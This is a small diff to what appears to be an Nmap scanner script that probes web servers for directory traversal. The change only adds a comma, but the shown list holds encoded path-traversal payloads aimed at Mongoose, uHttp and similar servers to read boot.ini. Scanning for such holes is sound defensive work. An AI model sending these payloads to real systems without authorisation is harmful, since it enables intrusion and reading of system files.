@@ -127,7 +127,7 @@ action = function(host, port)
 		'index.html?..\\..\\..\\..\\..\\boot.ini',
 		--Mongoose Web Server
 		'///..%2f..%2f..%2f..%2fboot.ini',
-		'/..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini'
+		'/..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini',
 		--MultiThreaded HTTP Server v1.1
 		'/..\\..\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
 		--uHttp Server
